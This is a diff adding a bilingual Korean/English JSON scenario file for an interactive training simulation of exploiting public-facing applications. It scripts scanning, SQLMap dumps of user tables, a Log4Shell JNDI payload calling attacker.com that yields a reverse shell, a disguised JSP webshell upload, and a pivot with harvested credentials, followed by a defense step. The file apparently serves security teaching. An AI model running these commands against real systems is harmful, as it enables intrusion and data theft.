@@ -1,0 +1,155 @@
+{
+  "id": "T1190",
+  "title": "공개 애플리케이션 취약점 악용 시뮬레이션",
+  "titleEn": "Exploit Public-Facing Application Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "🔍 취약점 스캔", "labelEn": "🔍 Vulnerability Scan", "steps": [0] },
+    { "label": "💉 SQL Injection", "labelEn": "💉 SQL Injection", "steps": [1] },
+    { "label": "🎯 RCE 웹쉘", "labelEn": "🎯 RCE Webshell", "steps": [2] },
+    { "label": "🛡️ 내부 침투", "labelEn": "🛡️ Internal Pivot", "steps": [3] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Scanner)", "x": 50, "y": 80 },
+    { "id": "waf", "label": "WAF\n(Bypassed)", "x": 180, "y": 80 },
+    { "id": "webapp", "label": "Web App\n(Vulnerable)", "x": 320, "y": 30 },
+    { "id": "database", "label": "Database\n(MySQL)", "x": 320, "y": 130 },
+    { "id": "internal", "label": "Internal\nNetwork", "x": 470, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "waf", "minStep": 0 },
+    { "from": "waf", "to": "webapp", "minStep": 1 },
+    { "from": "webapp", "to": "database", "minStep": 1 },
+    { "from": "webapp", "to": "internal", "minStep": 3 }
+  ],
+  "desktopIcons": [
+    { "name": "Nuclei", "icon": "🔍" },
+    { "name": "SQLMap", "icon": "💉" },
+    { "name": "Burp Suite", "icon": "🕷️" },
+    { "name": "Webshell", "icon": "🐚" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "# Nuclei로 취약점 자동 스캔\nnuclei -u https://target.com -t cves/ -severity critical,high\n\n# Nmap 서비스 탐지\nnmap -sV -p 80,443,8080,8443 target.com\n\n# 기술 스택 핑거프린팅\nwhatweb https://target.com\ncurl -I https://target.com",
+      "out": "[Nuclei 스캔 결과]\n[critical] CVE-2021-44228 Log4Shell → /api/v2/search\n[high] CVE-2023-34362 MOVEit SQLi → /api/transfer\n[high] CVE-2024-21887 Ivanti RCE → /api/v1/totp/verify\n[medium] CVE-2023-44487 HTTP/2 Rapid Reset\n\n[Nmap 서비스]\n80/tcp   Apache 2.4.49 (CVE-2021-41773)\n443/tcp  Nginx 1.18 + PHP 7.4\n8080/tcp Tomcat 9.0.50 (Log4j 2.14.1)\n8443/tcp Spring Boot 2.6.1\n\n[기술 스택]\nApache, PHP 7.4, MySQL 5.7\nWordPress 5.8, jQuery 3.5.1\n\n⚠️ 4개 Critical/High CVE 발견",
+      "def": "[WAF] Automated vulnerability scanning detected — Nuclei user-agent and scan patterns identified",
+      "defAction": "Tool: Nuclei + Nmap + WhatWeb\nCVEs: 4 critical/high vulnerabilities\nLog4Shell: /api/v2/search (Tomcat)\nMOVEit SQLi: /api/transfer\nIvanti RCE: /api/v1/totp/verify\nApache: CVE-2021-41773 path traversal\nRisk Level: Critical\nAction: Patch immediately, enable WAF rules",
+      "desc": "Nuclei와 Nmap으로 웹 애플리케이션을 스캔하여 Log4Shell, MOVEit SQLi 등 4개의 Critical/High 취약점을 발견합니다.",
+      "descEn": "Scan web application with Nuclei and Nmap, discover 4 Critical/High CVEs including Log4Shell and MOVEit SQLi.",
+      "stepTitle": "취약점 스캔 + CVE 식별",
+      "stepTitleEn": "Vulnerability Scanning + CVE Identification",
+      "feynman": "건물 외벽(공개 앱)을 두드려보며 깨진 창문(취약점)을 찾습니다. 자동 도구(Nuclei)가 알려진 취약점 패턴과 비교하여 4개의 진입점을 발견합니다.",
+      "feynmanEn": "Tap the building exterior (public app) looking for broken windows (vulnerabilities). Automated tools (Nuclei) compare against known patterns and find 4 entry points.",
+      "expert": "Nuclei는 YAML 템플릿 기반 취약점 스캐너로 7,000개 이상의 CVE 탐지 템플릿을 보유합니다. CVE-2021-44228(Log4Shell)은 CVSS 10.0의 JNDI Lookup RCE입니다. Nmap 서비스 배너는 정확한 버전 정보로 CVE 매핑을 가능하게 합니다.",
+      "expertEn": "Nuclei is a YAML template-based scanner with 7,000+ CVE templates. CVE-2021-44228 (Log4Shell) is CVSS 10.0 JNDI Lookup RCE. Nmap banners enable precise CVE mapping via version info.",
+      "defTooltip": "🔐 4개 Critical CVE 발견!",
+      "defTooltipEn": "🔐 4 Critical CVEs discovered!",
+      "hackerLog": { "title": "scan.log", "lines": ["[14:00:00] Nuclei CVE 스캔 시작", "[14:02:00] Log4Shell 발견", "[14:03:00] MOVEit SQLi 발견", "[14:05:00] 총 4개 CVE 식별"] },
+      "terms": [
+        { "term": "Nuclei", "def": "YAML 템플릿 기반 오픈소스 취약점 스캐너, 7000+ CVE 탐지" },
+        { "term": "CVE", "def": "Common Vulnerabilities and Exposures, 공개된 보안 취약점의 표준 식별자" }
+      ]
+    },
+    {
+      "cmd": "# SQLMap으로 SQL Injection 공격\nsqlmap -u \"https://target.com/api/transfer?id=1\" --dbs --batch\nsqlmap -u \"https://target.com/api/transfer?id=1\" -D webapp --tables --batch\nsqlmap -u \"https://target.com/api/transfer?id=1\" -D webapp -T users --dump --batch\n\n# 관리자 계정 탈취\nsqlmap -u \"https://target.com/api/transfer?id=1\" -D webapp -T users --where \"role='admin'\" --dump",
+      "out": "[SQLMap 결과]\nParameter: id (GET)\n  Type: UNION query\n  Payload: id=1 UNION ALL SELECT ...\n\n[데이터베이스]\n  information_schema\n  webapp\n  mysql\n\n[webapp 테이블]\n  users (15,432 rows)\n  orders (89,201 rows)\n  payments (42,100 rows)\n  sessions (3,200 rows)\n\n[관리자 계정]\n| id | username | password_hash | email | role |\n| 1 | admin | $2b$12$LJ... | admin@target.com | admin |\n| 5 | devops | $2b$12$Kx... | devops@target.com | admin |\n\n⚠️ 15,432명 사용자 데이터 + 관리자 해시 탈취",
+      "def": "[WAF/IDS] SQL Injection attack detected — UNION-based extraction from users table",
+      "defAction": "Tool: SQLMap (UNION-based SQLi)\nDatabase: webapp (MySQL 5.7)\nTables: users, orders, payments, sessions\nData: 15,432 users + 2 admin hashes\nPayments: 42,100 transaction records\nRisk Level: Critical\nAction: Patch query, deploy Parameterized Queries",
+      "desc": "SQLMap으로 MOVEit 스타일 SQL Injection을 악용하여 15,432명의 사용자 데이터와 관리자 비밀번호 해시를 탈취합니다.",
+      "descEn": "Exploit MOVEit-style SQL Injection with SQLMap, extract 15,432 user records and admin password hashes.",
+      "stepTitle": "SQL Injection + 데이터 탈취",
+      "stepTitleEn": "SQL Injection + Data Extraction",
+      "feynman": "도서관(DB)에 사서(웹앱)에게 거짓 요청서를 제출합니다. '1번 책과 모든 회원 명부를 달라'는 트릭(UNION SELECT)으로 회원 15,432명의 정보를 빼냅니다.",
+      "feynmanEn": "Submit a forged request to the librarian (web app). The trick 'give me book #1 AND all member records' (UNION SELECT) extracts 15,432 member records.",
+      "expert": "UNION-based SQLi는 SELECT 쿼리에 UNION ALL SELECT를 추가하여 다른 테이블 데이터를 합쳐 반환합니다. SQLMap은 Boolean-blind, Time-blind, Error-based, UNION 등 6가지 인젝션 기법을 자동 탐지합니다. bcrypt($2b$)는 Rainbow Table 공격에 강하지만 취약한 비밀번호는 사전 공격에 노출됩니다.",
+      "expertEn": "UNION-based SQLi appends UNION ALL SELECT to merge data from other tables. SQLMap auto-detects 6 injection types. bcrypt is rainbow table resistant but weak passwords fall to dictionary attacks.",
+      "defTooltip": "🔐 15,432명 데이터 유출!",
+      "defTooltipEn": "🔐 15,432 user records stolen!",
+      "hackerLog": { "title": "sqli.log", "lines": ["[14:10:00] SQLMap 인젝션 테스트", "[14:10:30] UNION 기반 SQLi 확인", "[14:11:00] 테이블 열거 완료", "[14:15:00] 사용자 데이터 덤프"] },
+      "terms": [
+        { "term": "SQLMap", "def": "SQL Injection 자동 탐지 및 악용 도구, 6가지 인젝션 기법 지원" },
+        { "term": "UNION SQLi", "def": "UNION SELECT로 다른 테이블 데이터를 결합하여 추출하는 SQL Injection 기법" }
+      ]
+    },
+    {
+      "cmd": "# Log4Shell RCE 악용\ncurl -H 'X-Api-Version: ${jndi:ldap://attacker.com:1389/exploit}' https://target.com:8080/api/v2/search\n\n# LDAP 리다이렉트 → 악성 Java 클래스 로딩\njava -cp exploit.jar Exploit\n\n# 웹쉘 업로드\ncurl -X POST https://target.com/upload -F 'file=@cmd.jsp;filename=image.jsp.jpg'",
+      "out": "[Log4Shell 공격]\nJNDI Lookup 트리거 성공!\n  → LDAP://attacker.com:1389 연결\n  → Exploit.class 다운로드 + 실행\n  → 리버스 쉘 획득! (tomcat 사용자)\n\n[서버 접근]\n$ whoami\ntomcat\n$ id\nuid=1001(tomcat) gid=1001(tomcat)\n$ uname -a\nLinux webapp-prod 5.4.0 x86_64\n\n[웹쉘 업로드]\ncmd.jsp 업로드 성공 (확장자 검증 우회)\nURL: https://target.com/uploads/image.jsp.jpg\n→ JSP 코드 실행 가능\n\n⚠️ 서버 RCE + 웹쉘 설치 완료",
+      "def": "[SIEM] Log4Shell exploitation detected — JNDI LDAP callback to external server, reverse shell established",
+      "defAction": "Tool: Log4Shell + JSP Webshell\nCVE: CVE-2021-44228 (CVSS 10.0)\nPayload: JNDI LDAP → Exploit.class\nAccess: tomcat user (reverse shell)\nWebshell: cmd.jsp (extension bypass)\nRisk Level: Critical\nAction: Update Log4j, remove webshell, audit file upload",
+      "desc": "Log4Shell(CVE-2021-44228)로 JNDI Lookup을 트리거하여 원격 코드 실행 후 리버스 쉘을 획득합니다. JSP 웹쉘도 업로드합니다.",
+      "descEn": "Trigger JNDI Lookup via Log4Shell for RCE, establish reverse shell. Upload JSP webshell with extension bypass.",
+      "stepTitle": "Log4Shell RCE + 웹쉘 설치",
+      "stepTitleEn": "Log4Shell RCE + Webshell Installation",
+      "feynman": "건물(서버)의 로그 시스템(Log4j)에 특수 메시지를 보냅니다. 로그가 메시지를 처리할 때 외부(attacker.com)에서 악성 프로그램을 다운받아 실행하게 됩니다.",
+      "feynmanEn": "Send a special message to the building's log system (Log4j). When the log processes the message, it downloads and runs a malicious program from outside (attacker.com).",
+      "expert": "Log4Shell은 Log4j의 JNDI Lookup 기능이 사용자 입력을 처리할 때 발생합니다. ${jndi:ldap://} 문자열이 로그에 기록되면 LDAP 서버에 연결하여 임의 Java 클래스를 로드합니다. 2021년 12월 발견 이후 가장 많이 악용된 취약점 중 하나입니다.",
+      "expertEn": "Log4Shell occurs when Log4j's JNDI Lookup processes user input. ${jndi:ldap://} in logs triggers LDAP connection to load arbitrary Java classes. One of the most exploited vulnerabilities since December 2021.",
+      "defTooltip": "🔐 Log4Shell RCE + 웹쉘!",
+      "defTooltipEn": "🔐 Log4Shell RCE + Webshell!",
+      "hackerLog": { "title": "rce.log", "lines": ["[14:20:00] JNDI 페이로드 전송", "[14:20:03] LDAP 콜백 수신", "[14:20:05] Exploit.class 실행", "[14:20:10] 리버스 쉘 획득"] },
+      "terms": [
+        { "term": "Log4Shell", "def": "CVE-2021-44228, Log4j JNDI Lookup 취약점으로 CVSS 10.0 원격 코드 실행" },
+        { "term": "JNDI", "def": "Java Naming and Directory Interface, Java에서 이름으로 객체를 찾는 API" }
+      ]
+    },
+    {
+      "cmd": "# 웹서버에서 내부 네트워크 침투\n# 내부 스캔\nfor i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i; done\nnmap -sn 10.0.0.0/24\n\n# DB 접근 (config에서 자격증명 추출)\ncat /opt/tomcat/conf/context.xml\nmysql -h 10.0.0.50 -u webapp -p'Pr0d_DB_2025!'",
+      "out": "[내부 스캔]\n10.0.0.10 - Active Directory DC\n10.0.0.20 - File Server (SMB)\n10.0.0.30 - Mail Server (Exchange)\n10.0.0.50 - MySQL Database\n10.0.0.100 - Jenkins CI/CD\n→ 5대 내부 서버 발견\n\n[DB 자격증명]\ncontext.xml:\n  url: jdbc:mysql://10.0.0.50:3306/webapp\n  username: webapp\n  password: Pr0d_DB_2025!\n\n[MySQL 접근]\nmysql> SELECT COUNT(*) FROM payments;\n+----------+\n| 42,100   |\n+----------+\nmysql> SHOW DATABASES;\nwebapp, hr_system, financial\n\n⚠️ DMZ에서 내부 네트워크 직접 접근 가능\n⚠️ DB 자격증명 config 파일에 평문 저장",
+      "def": "[SIEM] Lateral movement from DMZ — internal network scanning and database access from compromised web server",
+      "defAction": "Tool: nmap + MySQL client\nInternal: 5 servers discovered\nDB: 3 databases (webapp, hr, financial)\nPayments: 42,100 records accessible\nConfig: Plaintext credentials in context.xml\nRisk Level: Critical\nAction: Segment DMZ, encrypt configs, restrict DB access",
+      "desc": "침투한 웹서버에서 내부 네트워크를 스캔하여 5대 서버를 발견하고, config 파일의 평문 비밀번호로 MySQL에 접근하여 결제 데이터를 확인합니다.",
+      "descEn": "Scan internal network from compromised web server, discover 5 servers. Access MySQL with plaintext credentials from config, reach payment data.",
+      "stepTitle": "내부 네트워크 침투 + DB 접근",
+      "stepTitleEn": "Internal Network Pivot + Database Access",
+      "feynman": "깨진 창문(취약점)으로 들어온 후, 건물 내부 지도(네트워크 스캔)를 그립니다. 서버실 문에 붙어있는 비밀번호 메모(config)로 금고(DB)를 열어 결제 기록을 확인합니다.",
+      "feynmanEn": "After entering through the broken window, map the building interior (network scan). Open the vault (DB) with password notes (config) on server room doors to access payment records.",
+      "expert": "DMZ(De-Militarized Zone)는 외부 접근 가능 서버와 내부 네트워크를 분리하는 네트워크 세그먼트입니다. Tomcat의 context.xml에 JDBC 자격증명이 평문으로 저장되는 것은 CIS Benchmark 위반입니다. 내부 네트워크에서 DB까지 방화벽 규칙 없이 접근 가능한 것은 심각한 아키텍처 결함입니다.",
+      "expertEn": "DMZ separates externally accessible servers from internal networks. Plaintext JDBC credentials in Tomcat context.xml violates CIS Benchmarks. Unrestricted DB access from DMZ is a critical architecture flaw.",
+      "defTooltip": "🔐 DMZ → 내부 DB 직접 접근!",
+      "defTooltipEn": "🔐 DMZ → Direct internal DB access!",
+      "hackerLog": { "title": "pivot.log", "lines": ["[14:30:00] 내부 네트워크 스캔", "[14:32:00] 5대 서버 발견", "[14:33:00] config 비밀번호 추출", "[14:35:00] MySQL 접근 성공"] },
+      "terms": [
+        { "term": "DMZ", "def": "De-Militarized Zone, 외부 서비스와 내부 네트워크를 분리하는 네트워크 영역" },
+        { "term": "Lateral Movement", "def": "초기 접근 후 내부 네트워크의 다른 시스템으로 이동하는 공격 단계" }
+      ]
+    },
+    {
+      "cmd": "# 종합 방어 대책\n# WAF 규칙 적용\nmodsecurity-rules --enable OWASP-CRS-3.3\n\n# 패치 관리\napt update && apt upgrade -y\n\n# 입력 검증 + DMZ 세분화\niptables -A FORWARD -s 10.0.1.0/24 -d 10.0.0.0/24 -j DROP",
+      "out": "[WAF 적용]\n✅ OWASP CRS 3.3 규칙 활성화\n✅ SQLi/XSS/RCE 패턴 차단\n✅ Rate limiting: 100 req/min\n✅ Bot 탐지 활성화\n\n[패치 관리]\n✅ Log4j 2.17.1 업데이트\n✅ Apache 2.4.54 업데이트\n✅ PHP 8.2 업데이트\n✅ 자동 패치 스케줄 (주 1회)\n\n[네트워크 세분화]\n✅ DMZ → 내부 네트워크 직접 접근 차단\n✅ DB 전용 네트워크 분리\n✅ 웹서버 → DB 최소 포트만 허용 (3306)\n✅ 마이크로세분화 적용\n\n[추가 방어]\n✅ DAST/SAST 자동 스캐닝 (주 1회)\n✅ Parameterized Query 전수 적용\n✅ 파일 업로드 화이트리스트\n✅ RASP(Runtime Application Self-Protection)",
+      "def": "[SIEM] Web application defense deployed — WAF, patching, network segmentation, input validation enforced",
+      "defAction": "Tool: WAF + Patching + Segmentation + DAST\nWAF: OWASP CRS 3.3 + rate limiting\nPatching: All CVEs resolved, weekly schedule\nNetwork: DMZ isolated, DB segmented\nCode: Parameterized Queries + RASP\nUpload: Whitelist validation\nRisk Level: Low (with implementation)\nAction: Weekly DAST scans, monthly penetration tests",
+      "desc": "WAF OWASP CRS 규칙 적용, 모든 CVE 패치, DMZ 네트워크 세분화를 수행합니다. Parameterized Query와 RASP로 코드 수준 방어를 강화합니다.",
+      "descEn": "Apply WAF OWASP CRS rules, patch all CVEs, segment DMZ network. Strengthen code-level defense with Parameterized Queries and RASP.",
+      "stepTitle": "WAF + 패치 + 네트워크 세분화 + RASP",
+      "stepTitleEn": "WAF + Patching + Network Segmentation + RASP",
+      "feynman": "4가지 대책: 1) 건물 입구에 경비(WAF) 배치, 2) 깨진 창문 즉시 수리(패치), 3) 건물 내부 구역 잠금(세분화), 4) 모든 서류에 위변조 방지 인장(Parameterized Query).",
+      "feynmanEn": "4 measures: 1) Guards at entrance (WAF), 2) Fix broken windows immediately (patching), 3) Lock internal zones (segmentation), 4) Anti-forgery seals on all documents (Parameterized Queries).",
+      "expert": "OWASP CRS(Core Rule Set)는 ModSecurity/WAF용 표준 규칙 세트입니다. RASP는 애플리케이션 런타임에서 공격을 탐지하고 차단합니다. 마이크로세분화(Microsegmentation)는 워크로드 수준에서 네트워크를 분리하여 횡적 이동을 차단합니다.",
+      "expertEn": "OWASP CRS is the standard rule set for ModSecurity/WAF. RASP detects and blocks attacks at application runtime. Microsegmentation isolates networks at workload level to prevent lateral movement.",
+      "defTooltip": "🔐 웹 앱 방어 체계 완성!",
+      "defTooltipEn": "🔐 Web app defense system complete!",
+      "hackerLog": { "title": "defense.log", "lines": ["[15:00:00] WAF CRS 3.3 적용", "[15:05:00] CVE 패치 완료", "[15:10:00] DMZ 세분화", "[15:15:00] RASP 배포"] },
+      "terms": [
+        { "term": "OWASP CRS", "def": "Core Rule Set, WAF용 표준 보안 규칙 세트 (SQLi, XSS, RCE 탐지)" },
+        { "term": "RASP", "def": "Runtime Application Self-Protection, 런타임에서 공격을 감지하고 차단하는 보안 기술" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "nuclei",
+    "pid": 8000,
+    "children": [
+      {
+        "name": "sqlmap (SQLi)",
+        "pid": 8100,
+        "children": [
+          { "name": "log4shell (RCE)", "pid": 8110, "children": [
+            { "name": "reverse_shell (tomcat)", "pid": 8111, "children": [] }
+          ] }
+        ]
+      }
+    ]
+  }
+}
